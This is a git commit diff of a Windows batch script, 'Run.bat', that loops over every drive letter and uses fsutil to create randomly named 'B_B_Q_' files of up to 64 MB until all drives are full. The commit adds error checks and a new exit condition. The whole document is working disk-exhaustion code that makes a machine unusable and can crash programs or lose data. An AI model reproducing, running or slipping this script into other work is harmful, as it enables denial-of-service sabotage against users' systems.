21a6271fb7f8f75c1412116fe89bcff86cf0c08c
WorkChaosen <132773460+WorkChaosen@users.noreply.github.com>
2023-09-12 00:49:20 +0800

    Update Run.bat

--- Run.bat
+++ Run.bat
@@ -1,11 +1,9 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set "randomNamePrefix=B_B_Q_"
-set "maxFileSizeMB=64"
-
 :loop
 set "allDrivesFull=true"
+set "noSpaceOnAnyDrive=true"
 
 for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     set "Disk=%%d"
@@ -17,21 +15,27 @@ for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
                 set /a "rand=!random! %% 10"
                 set "randomName=!randomName!!rand!"
             )
-            set /a "size=!random! %% %maxFileSizeMB% + 1"
+            set /a "size=!random! %% 64 + 1"
             set /a "size=size * 1024 * 1024"
             pushd "!drive!"
             (
-                fsutil file createnew "!randomNamePrefix!!randomName!" !size! >nul
+                fsutil file createnew "B_B_Q_!randomName!" !size! >nul
+            )
+            if !errorlevel! neq 0 (
+                echo Not enough space on drive !drive! to create a file.
+            ) else (
+                set "noSpaceOnAnyDrive=false"
             )
             popd
-            set "allDrivesFull=false"
         )
     )
 )
 
-if %allDrivesFull%==false (
-    goto loop
+if %noSpaceOnAnyDrive%==true (
+    goto exit
 )
+
+goto loop
 
 :exit
 exit /b
